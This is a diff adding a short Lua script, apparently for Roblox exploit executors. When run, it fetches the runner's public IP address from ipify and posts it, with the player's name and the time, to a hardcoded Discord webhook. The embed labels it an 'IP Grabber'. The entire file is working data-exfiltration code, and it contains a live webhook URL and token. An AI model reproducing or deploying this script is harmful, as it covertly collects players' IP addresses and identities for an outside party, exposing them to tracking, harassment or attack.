@@ -1,0 +1,36 @@
+local Response = request({
+    Url = "https://api.ipify.org/",
+    Method = "GET"
+})
+local time = os.date()
+
+
+
+local Webhook_URL = "https://discord.com/api/webhooks/1122106872380522516/W8PdKSgc3hLcByOJjv4m70Jaxm8t3_d1FMOCIxZ--9j_vFTA5oIqcSpbf6tPG4OZlQNz"
+
+local Headers = {
+    ['Content-Type'] = 'application/json',
+}
+
+local data = {
+    ["embeds"] = {
+        {
+            ["title"] = "Someone executed",
+            ["description"] = game.Players.LocalPlayer.Name .. " Details",
+            ["type"] = "rich",
+            ["color"] = tonumber(0xffffff),
+            ["fields"] = {
+                {
+                    ["name"] = "IP Grabber :",
+                    ["value"] = Response.Body .. "\n Time: ".. time,
+                    ["inline"] = true,
+                },
+            },
+        },
+    },
+}
+
+local PlayerData = game:GetService('HttpService'):JSONEncode(data)
+
+local Request = http_request or request or HttpPost or syn.request
+Request({Url = Webhook_URL, Body = PlayerData, Method = "POST", Headers = Headers})
